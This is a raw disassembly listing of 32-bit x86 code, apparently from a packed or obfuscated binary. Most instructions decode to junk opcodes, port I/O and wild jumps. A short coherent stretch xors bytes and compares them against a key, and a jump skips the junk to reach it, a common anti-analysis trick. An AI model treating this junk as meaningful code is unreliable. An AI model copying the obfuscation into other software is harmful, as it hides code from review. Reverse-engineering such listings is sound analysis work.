  410b49:	and    DWORD PTR [edi+0x55614ea0],0x1
  410b50:	out    0xc5,eax
  410b52:	mov    ebx,0xd1abc976
  410b57:	pop    ebp
  410b58:	mov    ecx,ebp
  410b5a:	or     BYTE PTR [eax+0x50],bh
  410b5d:	jmp    0x459d4a70
  410b62:	and    al,0x8e
  410b64:	dec    esp
  410b65:	retf   0x8484
  410b68:	dec    esp
  410b69:	sbb    DWORD PTR [ebp+0x148ea27e],eax
  410b6f:	mov    DWORD PTR [esi-0x23972dc9],ebx
  410b75:	xor    al,0x7f
  410b77:	adc    DWORD PTR [ebx-0x2130270f],ebx
  410b7d:	leave  
  410b7e:	inc    esp
  410b7f:	cmp    eax,0xc4634b66
  410b84:	mov    ebp,DWORD PTR [edi]
  410b86:	mov    esp,0x3be58a9
  410b8b:	cdq    
  410b8c:	sub    ecx,DWORD PTR [ebp-0x67]
  410b8f:	xchg   edx,eax
  410b90:	loop   0x410b9a
  410b92:	ins    BYTE PTR es:[edi],dx
  410b93:	out    0xd0,al
  410b95:	or     BYTE PTR [ecx+0x61],bh
  410b98:	add    DWORD PTR [ebx+0x26f786d8],edi
  410b9e:	jecxz  0x410b48
  410ba0:	dec    ecx
  410ba1:	xor    BYTE PTR [eax],bl
  410ba3:	and    eax,0x70ca7620
  410ba8:	sub    eax,0x36354e13
  410bad:	lock (bad) 
  410bb0:	sbb    BYTE PTR [edx-0x33],ah
  410bb3:	mov    ah,0xf5
  410bb5:	adc    edi,0xffffffe6
  410bb8:	push   ebx
  410bb9:	(bad)  
  410bba:	push   ebx
  410bbb:	repz mov bl,0x1a
  410bbe:	not    DWORD PTR [eax+0x28]
  410bc1:	mov    dh,0x1a
  410bc3:	cmp    esp,ecx
  410bc5:	hlt    
  410bc6:	xchg   ebx,eax
  410bc7:	shr    BYTE PTR [ebx+0x2d],0x6f
  410bcb:	rcl    BYTE PTR [esi+0x0],0x9a
  410bcf:	cmp    BYTE PTR [ebp-0x5f99fadd],al
  410bd5:	xor    eax,0x2469d61c
  410bda:	rcl    DWORD PTR [ecx],1
  410bdc:	pop    es
  410bdd:	ins    DWORD PTR es:[edi],dx
  410bde:	mov    WORD PTR [eax-0x748ca9f7],?
  410be4:	xor    BYTE PTR [edi],ch
  410be6:	xchg   ebx,eax
  410be7:	hlt    
  410be8:	out    0x1f,eax
  410bea:	bound  ecx,QWORD PTR [edi]
  410bec:	jmp    0xce60:0xe7eff4c0
  410bf3:	ja     0x410b77
  410bf5:	mov    esi,0x807d9905
  410bfa:	and    BYTE PTR [esi],al
  410bfc:	xchg   ecx,eax
  410bfd:	push   es
  410bfe:	loop   0x410c19
  410c00:	jle    0x410c18
  410c02:	and    eax,0xe91c22
  410c07:	stos   BYTE PTR es:[edi],al
  410c08:	loope  0x410beb
  410c0a:	dec    ebp
  410c0b:	mov    bh,0x81
  410c0d:	popf   
  410c0e:	loopne 0x410c61
  410c10:	add    eax,DWORD PTR [ebx]
  410c12:	adc    ah,BYTE PTR [ecx]
  410c14:	dec    ecx
  410c15:	push   esp
  410c16:	jo     0x410c29
  410c18:	pop    ebp
  410c19:	and    DWORD PTR [ebx+0x3898742a],0xe9bd0c03
  410c23:	or     BYTE PTR [esi-0x32fd9770],ah
  410c29:	repnz data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c2c:	push   0x228ed430
  410c31:	dec    eax
  410c32:	xchg   ecx,eax
  410c33:	xchg   edi,eax
  410c34:	int3   
  410c35:	ret    
  410c36:	dec    ebx
  410c37:	(bad)  
  410c38:	xchg   edi,eax
  410c39:	add    al,0x3c
  410c3b:	xchg   edi,eax
  410c3c:	fst    DWORD PTR [edx+eiz*8+0x1bc7f6e4]
  410c43:	and    al,0xc8
  410c45:	pop    eax
  410c46:	jo     0x410c92
  410c48:	fimul  DWORD PTR [esi+ecx*8-0x3084d75]
  410c4f:	test   al,0x43
  410c51:	mov    al,0xba
  410c53:	pop    edx
  410c54:	std    
  410c55:	and    esp,DWORD PTR [esi+0x2154cd42]
  410c5b:	aam    0x13
  410c5d:	pop    edx
  410c5e:	sub    cl,BYTE PTR [ebx-0x480e3f47]
  410c64:	ja     0x410bfa
  410c66:	fucomip st,st(4)
  410c68:	lahf   
  410c69:	aaa    
  410c6a:	and    DWORD PTR [ecx-0xc],esi
  410c6d:	add    al,0x6a
  410c6f:	test   ecx,esi
  410c71:	sub    al,0x5d
  410c73:	jns    0x410c8c
  410c75:	push   0xffffffda
  410c77:	adc    ebp,edx
  410c79:	jo     0x410c24
  410c7b:	pop    es
  410c7c:	int3   
  410c7d:	adc    DWORD PTR [ecx-0x46],esi
  410c80:	scas   eax,DWORD PTR es:[edi]
  410c81:	sbb    ah,BYTE PTR [ecx+edi*1+0x7e]
  410c85:	fist   DWORD PTR [ecx]
  410c87:	mov    eax,DWORD PTR [eax+eiz*8-0x66]
  410c8b:	(bad)  
  410c8c:	mov    edx,0x2ecd55ae
  410c91:	dec    ch
  410c93:	push   ebx
  410c94:	std    
  410c95:	add    bl,BYTE PTR [esi]
  410c97:	loop   0x410c6b
  410c99:	out    dx,al
  410c9a:	inc    ecx
  410c9b:	leave  
  410c9c:	mov    esp,0x2cfdb308
  410ca1:	(bad)  
  410ca2:	loop   0x410c5e
  410ca4:	cmp    eax,0x98f74e03
  410ca9:	sub    edi,DWORD PTR [edx+0x705bb550]
  410caf:	sar    BYTE PTR [edx+0x2ba5b0f6],0xf9
  410cb6:	mov    cl,0xee
  410cb8:	test   ch,ah
  410cba:	inc    BYTE PTR [edx+eax*1-0x19d552ef]
  410cc1:	scas   eax,DWORD PTR es:[edi]
  410cc2:	mov    ds:0xfb30e08a,eax
  410cc7:	add    esi,DWORD PTR [esi-0x32]
  410cca:	sahf   
  410ccb:	aas    
  410ccc:	inc    edi
  410ccd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cce:	and    eax,edi
  410cd0:	mov    al,0x45
  410cd2:	outs   dx,DWORD PTR ds:[esi]
  410cd3:	arpl   WORD PTR [ebp+0x6f],di
  410cd6:	xor    BYTE PTR [esi+0x1e],al
  410cd9:	out    dx,eax
  410cda:	lods   al,BYTE PTR ds:[esi]
  410cdb:	sbb    dh,BYTE PTR [eax]
  410cdd:	push   ebp
  410cde:	pop    eax
  410cdf:	xchg   esi,eax
  410ce0:	sub    dh,ch
  410ce2:	pusha  
  410ce3:	mov    ecx,0x9cb0edd6
  410ce8:	std    
  410ce9:	popf   
  410cea:	mov    ebp,0x9de9c9cd
  410cef:	cmc    
  410cf0:	repz mov es:0x66a520e,eax
  410cf7:	mov    bl,0xdd
  410cf9:	add    al,0x19
  410cfb:	in     eax,dx
  410cfc:	cmp    eax,0xa72d597b
  410d01:	icebp  
  410d02:	sbb    eax,DWORD PTR [ebx]
  410d04:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  410d06:	jle    0x410d1c
  410d08:	lods   al,BYTE PTR ds:[esi]
  410d09:	fsubp  st(3),st
  410d0b:	xchg   ecx,eax
  410d0c:	mov    DWORD PTR [edx],eax
  410d0e:	mov    eax,DWORD PTR [ebp-0x8]
  410d11:	jmp    0x410fdf
  410d16:	je     0x410d40
  410d18:	(bad)  
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0x304ffa9c
  410d25:	mov    ch,bl
  410d27:	mov    eax,0x7caf7e7e
  410d2c:	jle    0x410dac
  410d2e:	pop    es
  410d2f:	and    al,0xdb
  410d31:	popa   
  410d32:	loop   0x410d12
  410d34:	mov    eax,0xb0a02862
  410d39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d3a:	sbb    esi,DWORD PTR [edi+0x49]
  410d3d:	aas    
  410d3e:	sub    DWORD PTR [esi+ecx*8-0x758551d],ebx
  410d45:	adc    al,0xb1
  410d47:	sbb    eax,0x65f5b75b
  410d4c:	out    0xda,al
  410d4e:	call   0xaf9c:0x26a953a
  410d55:	lock jns 0x410ceb
  410d58:	inc    esp
  410d59:	and    eax,0x31784a7e
  410d5e:	pop    esi
  410d5f:	imul   DWORD PTR [edi-0x2bddf7b7]
  410d65:	mov    al,0x78
  410d67:	ds mov edx,0x1267f9cc
  410d6d:	daa    
  410d6e:	push   esp
  410d6f:	xchg   edx,eax
  410d70:	mov    ax,ds:0xb4141794
  410d76:	sub    al,BYTE PTR [ecx+0x7b6dd23d]
  410d7c:	cmp    BYTE PTR [esi+0x25],dh
  410d7f:	mov    eax,0x549e150a
  410d84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d85:	sub    eax,0x4ba42329
  410d8a:	test   al,0xae
  410d8c:	dec    esp
  410d8d:	jge    0x410d25
  410d8f:	retf   
  410d90:	in     al,dx
  410d91:	iret   
  410d92:	pop    esp
  410d93:	imul   esp,DWORD PTR [edi+0x19],0x46
  410d97:	aam    0xb3
  410d99:	xor    al,0xa0
  410d9b:	jp     0x410dd1
  410d9d:	das    
  410d9e:	cmp    esi,ebp
  410da0:	outs   dx,DWORD PTR ds:[esi]
  410da1:	loopne 0x410d35
  410da3:	lock mov eax,ds:0x9da8bb32
  410da9:	jg     0x410d37
  410dab:	and    DWORD PTR [esi-0x7197e591],esi
  410db1:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410db3:	test   al,0xda
  410db5:	xchg   ebx,eax
  410db6:	sbb    al,0x54
  410db8:	sbb    al,0xb1
  410dba:	xchg   esp,eax
  410dbb:	stc    
  410dbc:	test   eax,0x12356573
  410dc1:	xchg   BYTE PTR [ebx-0x3],ch
  410dc4:	cmp    esi,DWORD PTR [ecx+esi*1+0x28547216]
  410dcb:	iret   
  410dcc:	jb     0x410e33
  410dce:	mov    ds:0x4ef2a1a3,eax
  410dd3:	and    ah,dl
  410dd5:	adc    BYTE PTR [ecx+0x70],al
  410dd8:	test   BYTE PTR [esi+0x45],dl
  410ddb:	int    0x60
  410ddd:	cmp    dl,BYTE PTR [edx+ebx*1]
  410de0:	fucomip st,st(7)
  410de2:	and    cl,BYTE PTR [edx-0x7f3d61de]
  410de8:	sar    DWORD PTR [edx+0x10f0d64f],cl
  410dee:	in     al,dx
  410def:	pop    ebp
  410df0:	shr    DWORD PTR [ecx-0x681a1c2a],cl
  410df6:	dec    edx
  410df7:	rcr    DWORD PTR [edx+0x5],1
  410dfa:	fwait
  410dfb:	ins    BYTE PTR es:[edi],dx
  410dfc:	in     eax,0x8
  410dfe:	mov    ecx,0xd61d83f9
  410e03:	in     al,dx
  410e04:	popf   
  410e05:	jp     0x410e05
  410e07:	and    al,0x78
  410e09:	mov    edi,DWORD PTR [eax]
  410e0b:	mov    ebp,0x9e7f4d86
  410e10:	push   ss
  410e11:	icebp  
  410e12:	sub    dh,ah
  410e14:	xchg   edi,eax
  410e15:	xchg   DWORD PTR [edi+0x72],edi
  410e18:	inc    edi
  410e19:	mov    bl,0x45
  410e1b:	dec    DWORD PTR [edi+0x7e9b0712]
  410e21:	repnz cmp bh,BYTE PTR [ecx-0x4b130531]
  410e28:	mov    ch,0x35
  410e2a:	push   ecx
  410e2b:	(bad)  
  410e2c:	push   ebx
  410e2d:	leave  
  410e2e:	je     0x410e61
  410e30:	or     esi,ecx
  410e32:	in     eax,0x97
  410e34:	mov    bh,0x54
  410e36:	xor    DWORD PTR [edi-0x4bafa4d7],eax
  410e3c:	shr    DWORD PTR ds:0x13475f97,1
  410e42:	frstor [edi-0x69]
  410e45:	mov    esp,0x346389cc
  410e4a:	and    eax,0xf40d9598
  410e4f:	das    
  410e50:	ja     0x410e19
  410e52:	xchg   BYTE PTR [ecx+0x60],dl
  410e55:	xor    BYTE PTR [edi-0x3e],dh
  410e58:	or     bl,BYTE PTR [esi+0x47]
  410e5b:	pop    edx
  410e5c:	addr16 jg 0x410e16
  410e5f:	dec    esi
  410e60:	sub    DWORD PTR [edi-0x534d8d9d],ebx
  410e66:	arpl   bx,sp
  410e68:	icebp  
  410e69:	add    ebx,DWORD PTR [edx-0x1b0a3ef1]
  410e6f:	(bad)  
  410e70:	in     al,0x1f
  410e72:	and    edx,DWORD PTR [ebx]
  410e74:	aad    0xf9
  410e76:	aam    0x3a
  410e78:	sbb    al,0xbc
  410e7a:	lock repnz dec ebx
  410e7d:	pop    edx
  410e7e:	leave  
  410e7f:	iret   
  410e80:	gs hlt 
  410e82:	(bad)  [esi]
  410e84:	mov    BYTE PTR [eax+0x1e9fca5],bh
  410e8a:	adc    eax,0x618dd5d5
  410e8f:	scas   eax,DWORD PTR es:[edi]
  410e90:	adc    eax,edi
  410e92:	xchg   edx,eax
  410e93:	jl     0x410ebf
  410e95:	les    edi,FWORD PTR [ecx-0x3ead30e2]
  410e9b:	in     eax,0x1d
  410e9d:	mov    dh,0xbd
  410e9f:	pop    edi
  410ea1:	mov    ecx,0x19585ee1
  410ea6:	retf   
  410ea7:	arpl   WORD PTR [esi],sp
  410ea9:	sbb    al,0xbe
  410eab:	mov    ds:0xfa8d6bc8,al
  410eb0:	or     bh,BYTE PTR [eax+0x6b]
  410eb3:	mov    cl,0x50
  410eb5:	shr    DWORD PTR [esi-0x3c],1
  410eb8:	sub    BYTE PTR [edx+0x46],ah
  410ebb:	add    eax,DWORD PTR [ebx]
  410ebd:	sbb    DWORD PTR [eax-0x1c851e60],0xfffffff4
  410ec4:	xor    al,0x1c
  410ec6:	adc    al,0x9a
  410ec8:	cmp    eax,0x45b01f27
  410ecd:	inc    edi
  410ece:	jecxz  0x410e94
  410ed0:	fild   WORD PTR [eax-0x71]
  410ed3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ed4:	push   edx
  410ed5:	push   edi
  410ed6:	xor    DWORD PTR [eax+0x2a85160],ebx
  410edc:	cmp    eax,0x941f90e8
  410ee1:	cmc    
  410ee2:	cwde   
  410ee3:	pop    ss
  410ee4:	xchg   BYTE PTR [ebx+0x5f4a40db],ch
  410eea:	push   ss
  410eeb:	xor    edi,DWORD PTR [eax+0x19]
  410eee:	fisub  WORD PTR [edi-0x533f4c6a]
  410ef4:	data16 sbb al,0x87
  410ef7:	adc    BYTE PTR [esi],bl
  410ef9:	jnp    0x410ed2
  410efb:	popf   
  410efc:	sub    al,0x8a
  410efe:	sbb    ecx,0xffffffd5
  410f01:	les    esi,FWORD PTR ds:0x5af7aba9
  410f07:	retf   
  410f08:	push   edi
  410f09:	xor    BYTE PTR [ebp-0x382c6ce9],cl
  410f0f:	pop    ebx
  410f10:	cmp    ebx,DWORD PTR [eax]
  410f12:	mov    bl,0x9d
  410f14:	push   0xe22e154e
  410f19:	hlt    
  410f1a:	push   esi
  410f1b:	inc    ebp
  410f1c:	push   ecx
  410f1d:	sbb    eax,edi
  410f1f:	(bad)  
  410f20:	es out dx,al
  410f22:	fistp  DWORD PTR [eax+0x51]
  410f25:	cwde   
  410f26:	clc    
  410f27:	enter  0x79ad,0xb8
  410f2b:	dec    esi
  410f2c:	into   
  410f2d:	in     al,0x70
  410f2f:	sbb    DWORD PTR [esi-0xf],edi
  410f32:	sbb    ebp,DWORD PTR [ebx]
  410f34:	mov    al,0xda
  410f36:	sbb    dh,dh
  410f38:	or     ah,ch
  410f3a:	mov    ebp,0x734052b1
  410f3f:	stc    
  410f40:	in     eax,dx
  410f41:	fs xchg ebx,eax
  410f43:	inc    eax
  410f44:	outs   dx,DWORD PTR ds:[esi]
  410f45:	xor    dh,BYTE PTR [ecx-0x354a32ec]
  410f4b:	jecxz  0x410efe
  410f4d:	popf   
  410f4e:	gs (bad) 
  410f50:	mov    al,ds:0x761c26e1
  410f55:	in     eax,dx
  410f56:	xchg   ebp,eax
  410f57:	imul   ebp,DWORD PTR [eax+0x5],0x6b04249b
  410f5e:	cld    
  410f5f:	mov    esp,0x21c31825
  410f64:	fstp   st(6)
  410f66:	pop    ebp
  410f67:	mov    dl,0x6b
  410f69:	repz lock jno 0x410fb6
  410f6d:	lods   al,BYTE PTR ds:[esi]
  410f6e:	les    ebp,FWORD PTR [ebx+0x2247a2d0]
  410f74:	mov    BYTE PTR [ecx-0x19],al
  410f77:	inc    esi
  410f78:	stos   DWORD PTR es:[edi],eax
  410f79:	xor    BYTE PTR [edi-0x18],dl
  410f7c:	test   al,0x5c
  410f7e:	jne    0x410f5f
  410f80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f81:	xchg   ebp,eax
  410f82:	cli    
  410f83:	xchg   BYTE PTR [eax],bl
  410f85:	and    al,0x7
  410f87:	hlt    
  410f88:	outs   dx,BYTE PTR ds:[esi]
  410f89:	dec    ecx
  410f8a:	inc    esp
  410f8c:	imul   esp,edi,0xba408bb4
  410f92:	dec    eax
  410f93:	dec    edi
  410f94:	cmp    eax,0x9f9cc9e1
  410f99:	stos   BYTE PTR es:[edi],al
  410f9a:	mov    esp,0xb09e5231
  410f9f:	test   eax,0x8e5ae868
  410fa4:	lea    edi,[eax+edx*1]
  410fa7:	mov    esp,0x34e55cb8
  410fac:	ss (bad) 
  410fae:	out    0xf2,al
  410fb0:	mov    bh,0x1b
  410fb2:	mov    edi,0x97431a66
  410fb7:	inc    ebx
  410fb8:	lods   al,BYTE PTR ds:[esi]
  410fb9:	fistp  DWORD PTR [ebx]
  410fbb:	mov    ds:0x720d7d57,eax
  410fc0:	shl    BYTE PTR [edi-0x5b35fe16],0xbe
  410fc7:	mov    al,ds:0x95d97151
  410fcc:	lods   al,BYTE PTR fs:[esi]
  410fce:	sbb    ebx,ebp
  410fd0:	push   0x9
  410fd2:	enter  0xb9c8,0x69
  410fd6:	clc    
  410fd7:	sbb    bh,BYTE PTR [ebx+0x49]
  410fda:	pop    esp
  410fdb:	outs   dx,BYTE PTR ds:[esi]
  410fdc:	or     al,0xe9
  410fde:	cdq    
  410fdf:	xor    eax,ecx
  410fe1:	add    eax,esi
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x410fce
  41102b:	das    
  41102c:	(bad)  
  41102d:	repz sbb BYTE PTR [edi+0x7e],al
  411031:	jle    0x410fe2
  411033:	jl     0x4110b3
  411035:	jle    0x41109c
  411037:	or     bh,BYTE PTR [ebp-0x62bc2c29]
  41103d:	push   ds
  41103e:	fucom  st(3)
  411040:	mov    al,ds:0xc88f5d36
  411045:	fiadd  DWORD PTR [ebp-0x8]
  411048:	xor    ah,ah
  41104a:	(bad)  
  41104b:	push   ebx
  41104c:	scas   eax,DWORD PTR es:[edi]
  41104d:	push   es
  41104e:	test   BYTE PTR [eax+0x70642b15],0x4d
  411055:	mov    ebx,0x272dcab
  41105a:	(bad)  
  41105b:	xlat   BYTE PTR ds:[ebx]
  41105c:	in     al,0xa5
  41105e:	pop    esp
  41105f:	cmp    al,0xcb
  411061:	mov    dl,bh
  411063:	add    DWORD PTR [edi+eax*8+0x4ef25b6f],esi
  41106a:	adc    al,BYTE PTR [edi-0x5df29e39]
  411070:	and    al,0x3c
  411072:	jbe    0x4110cd
  411074:	out    0x70,al
  411076:	xor    al,0xb9
  411078:	arpl   WORD PTR [eax],cx
  41107a:	adc    al,0xe5
  41107c:	clc    
  41107d:	xlat   BYTE PTR ds:[ebx]
  41107e:	xor    BYTE PTR [ebx+ebx*2],bh
  411081:	inc    eax
  411082:	daa    
  411083:	idiv   BYTE PTR [ecx]
  411085:	or     bp,sp
  411088:	ins    BYTE PTR es:[edi],dx
  411089:	jne    0x411088
  41108b:	(bad)  
  41108c:	cwde   
  41108d:	mov    bh,0x7e
  41108f:	daa    
  411090:	xor    BYTE PTR [eax+eiz*2],dh
  411093:	inc    edx
  411094:	icebp  
  411095:	popa   
  411096:	sbb    eax,0x7dbea20a
  41109b:	cmp    eax,0x7c233f08
  4110a0:	fadd   DWORD PTR [esi+0x2a]
  4110a3:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4110a5:	enter  0x544d,0x80
  4110a9:	popf   
  4110aa:	xor    ch,al
  4110ac:	test   BYTE PTR [esi],0x69
  4110af:	dec    edx
  4110b0:	scas   al,BYTE PTR es:[edi]
  4110b1:	add    edx,eax
  4110b3:	adc    eax,0xf7fcdb80
  4110b8:	fstp   TBYTE PTR [edi+0x4]
  4110bb:	mov    esi,0x20f74c61
  4110c0:	inc    esi
  4110c1:	(bad)  
  4110c2:	jnp    0x411054
  4110c4:	adc    cl,dh
  4110c6:	mov    bh,0x76
  4110c8:	fst    DWORD PTR [ecx-0x6f]
  4110cb:	and    ecx,DWORD PTR [ecx+0x43]
  4110ce:	ins    BYTE PTR es:[edi],dx
  4110cf:	jns    0x411095
  4110d1:	leave  
  4110d2:	jae    0x411072
  4110d4:	xchg   edx,eax
  4110d5:	outs   dx,BYTE PTR ds:[esi]
  4110d6:	and    BYTE PTR [edx-0x749c65c3],ah
  4110dc:	out    0x2a,eax
  4110de:	sbb    eax,0x1212d68f
  4110e3:	out    dx,eax
  4110e4:	push   ds
  4110e5:	sbb    esi,ebp
  4110e7:	test   BYTE PTR [eax+0x29303d7d],0x97
  4110ee:	outs   dx,DWORD PTR ds:[esi]
  4110ef:	pop    ss
  4110f0:	jp     0x411106
  4110f2:	sbb    edx,edx
  4110f4:	outs   dx,DWORD PTR ds:[esi]
  4110f5:	cmp    DWORD PTR [ecx+0x1b],eax
  4110f8:	ds ds ins DWORD PTR es:[edi],dx
  4110fb:	or     esp,ecx
  4110fd:	push   cs
  4110fe:	xor    DWORD PTR [ecx+0xb3c8770],esi
  411104:	and    al,BYTE PTR [esi]
  411106:	js     0x4110c8
  411108:	iret   
  411109:	inc    esp
  41110a:	adc    al,BYTE PTR [esp+ebx*2]
  41110d:	push   esp
  41110e:	and    eax,0xa3488b72
  411113:	(bad)  
  411114:	jmp    0x4110c5
  411116:	or     ebp,DWORD PTR [ebp-0x234f79ba]
  41111c:	xchg   esp,eax
  41111d:	(bad)  
  41111e:	mov    al,0xea
  411120:	xchg   DWORD PTR [ecx-0x78fd5101],esp
  411126:	cdq    
  411127:	mov    dh,0xc6
  411129:	mov    ds,WORD PTR [ebx]
  41112b:	pop    ebx
  41112c:	cmp    esi,DWORD PTR [eax]
  41112e:	sub    eax,0xee442dbf
  411133:	adc    DWORD PTR [esi-0x7de061e0],ecx
  411139:	xchg   edx,ecx
  41113b:	ret    
  41113c:	sub    eax,0xfb272a08
  411141:	pop    edx
  411142:	enter  0x8bf,0x6e
  411146:	xchg   ebx,eax
  411147:	adc    al,0xef
  411149:	xchg   BYTE PTR [esi],dh
  41114b:	jno    0x411121
  41114d:	xchg   esi,eax
  41114e:	int    0x90
  411150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411151:	xor    dl,BYTE PTR [ecx+0x10]
  411154:	xchg   ecx,eax
  411155:	push   0xe87364b4
  41115a:	pop    ebx
  41115b:	xchg   cl,bl
  41115d:	sbb    BYTE PTR [ecx],ah
  41115f:	xchg   edx,eax
  411160:	cmp    DWORD PTR [ebx-0x6d93cec9],0x4
  411167:	pop    edx
  411168:	fiadd  WORD PTR [ecx-0x57]
  41116b:	(bad)  
  41116c:	xor    BYTE PTR [edx],0xa0
  41116f:	sbb    BYTE PTR [ebx-0x3e8edbe7],al
  411175:	pop    ds
  411176:	mov    BYTE PTR [edx+0xc1cbb13],cl
  41117c:	scas   eax,DWORD PTR es:[edi]
  41117d:	mov    WORD PTR [eax+0x4e40277],es
  411183:	cmp    eax,0x4a56746a
  411188:	inc    esp
  411189:	(bad)  
  41118a:	loope  0x411110
  41118c:	scas   eax,DWORD PTR es:[edi]
  41118d:	push   0x2684584
  411192:	mov    ah,0x91
  411194:	inc    ebx
  411195:	repz mov bl,0x31
  411198:	scas   eax,DWORD PTR es:[di]
  41119a:	imul   esi,eax,0xffffffc1
  41119d:	fucomip st,st(3)
  41119f:	cmp    bl,BYTE PTR [edi-0x54]
  4111a2:	iret   
  4111a3:	cmp    ch,BYTE PTR [edi-0x65ec20a8]
  4111a9:	or     DWORD PTR [eax+0x5e82b23e],edx
  4111af:	cmp    DWORD PTR [esi-0x14be4d21],eax
  4111b5:	aad    0xc7
  4111b7:	adc    cl,al
  4111b9:	iret   
  4111ba:	clc    
  4111bb:	cmp    BYTE PTR [eax+0x45cb141],cl
  4111c1:	out    dx,eax
  4111c2:	lods   eax,DWORD PTR ds:[esi]
  4111c3:	pop    edi
  4111c4:	ja     0x41119e
  4111c6:	shr    DWORD PTR [esi+0x5a],cl
  4111c9:	push   esi
  4111ca:	sub    eax,0x332399b7
  4111cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111d0:	mov    ds:0x68af81bc,eax
  4111d5:	push   esi
  4111d6:	int3   
  4111d7:	ins    DWORD PTR es:[edi],dx
  4111d8:	loopne 0x4111ba
  4111da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111db:	mov    dh,0xf5
  4111dd:	xchg   DWORD PTR [eax+0x45d8aafc],ebp
  4111e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111e4:	fimul  DWORD PTR [edx-0x2c]
  4111e7:	push   eax
  4111e8:	jo     0x411222
  4111ea:	cmp    edi,ebx
  4111ec:	pop    ebp
  4111ed:	and    bh,BYTE PTR [edx+0x1775c365]
  4111f3:	fidivr WORD PTR [eax+0x7f]
  4111f6:	xor    bh,bl
  4111f8:	adc    eax,0xe83cfdd9
  4111fd:	call   DWORD PTR gs:[ebx+edi*8-0x39f501d7]
  411205:	inc    ecx
  411206:	xor    edx,DWORD PTR [ebx]
  411208:	mov    ebx,0x96e4ceb4
  41120d:	aam    0x24
  41120f:	mov    ah,BYTE PTR [eax-0x80]
  411212:	call   0x95a8f05b
  411217:	cmc    
  411218:	(bad)  
  411219:	jle    0x4111f0
  41121b:	outs   dx,BYTE PTR ds:[esi]
  41121c:	xchg   BYTE PTR [esi+0x4db00481],al
  411222:	shr    bl,cl
  411224:	ins    BYTE PTR es:[edi],dx
  411225:	xchg   esi,eax
  411226:	stos   BYTE PTR es:[edi],al
  411227:	imul   esi,DWORD PTR [esi+0x3454503],0x199876e0
  411231:	out    dx,al
  411232:	outs   dx,BYTE PTR ds:[esi]
  411233:	jle    0x4111d3
  411235:	ja     0x411253
  411237:	adc    ah,BYTE PTR [ebx+0x54ad529]
  41123d:	cmp    BYTE PTR [ecx],bh
  41123f:	pop    esp
  411240:	pop    edx
  411241:	lea    esp,[eax+0x35]
  411244:	ficomp DWORD PTR [ecx]
  411246:	test   al,0x63
  411248:	jg     0x411224
  41124a:	jl     0x411281
  41124c:	cmp    bl,BYTE PTR [edi]
  41124e:	lea    edi,[eax+0x6b4b0a2c]
  411254:	stos   DWORD PTR es:[edi],eax
  411255:	xchg   ebp,eax
  411256:	cli    
  411257:	cmp    dl,BYTE PTR [eax-0x41]
  41125a:	ds imul ebx,ecx,0x8300a0fc
  411261:	cli    
  411262:	or     edi,DWORD PTR [esi-0x61a8133b]
  411268:	push   edi
  411269:	mov    al,0x8f
  41126b:	jle    0x41126d
  41126d:	mov    ch,BYTE PTR [ebx+edi*2+0x51c3328]
  411274:	mov    esp,0x997457c1
  411279:	(bad)  
  41127a:	xlat   BYTE PTR ds:[ebx]
  41127b:	add    dl,dl
  41127d:	mov    ds:0x8c6c356b,al
  411282:	jb     0x4112a7
  411284:	enter  0xa3a4,0xae
  411288:	idiv   BYTE PTR [ecx-0x17]
  41128b:	mov    edi,0x1f71842d
  411290:	out    0x22,eax
  411292:	dec    esp
  411293:	xchg   esp,eax
  411294:	clc    
  411295:	sti    
  411296:	stc    
  411297:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411298:	icebp  
  411299:	into   
  41129a:	jl     0x411225
  41129c:	call   edx
  41129e:	and    al,BYTE PTR [esi]
  4112a0:	pushf  
  4112a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112a2:	or     BYTE PTR [ecx-0x5f383ec1],cl
  4112a8:	call   0x258527a3
  4112ad:	es rcr DWORD PTR fs:[eax],cl
  4112b1:	push   0xffffffb3
  4112b3:	pop    ss
  4112b4:	sub    bh,BYTE PTR [edx+0x4c4c89b5]
  4112ba:	mov    ds:0x2fadf201,al
  4112bf:	dec    edx
  4112c0:	hlt    
  4112c1:	mov    ebx,0x15304e24
  4112c6:	lea    ebp,[eax+edi*2+0xb]
  4112ca:	push   cs
  4112cb:	fnsave [esp+esi*2+0x6f6c0df0]
  4112d2:	icebp  
  4112d3:	into   
  4112d4:	inc    edi
  4112d5:	xchg   esp,eax
  4112d6:	prefetch BYTE PTR [esi+0x2]
  4112da:	std    
  4112db:	stos   DWORD PTR es:[edi],eax
  4112dc:	cmp    BYTE PTR [edi+0x6213fc64],ch
  4112e2:	adc    al,0x7c
  4112e4:	loop   0x4112d9
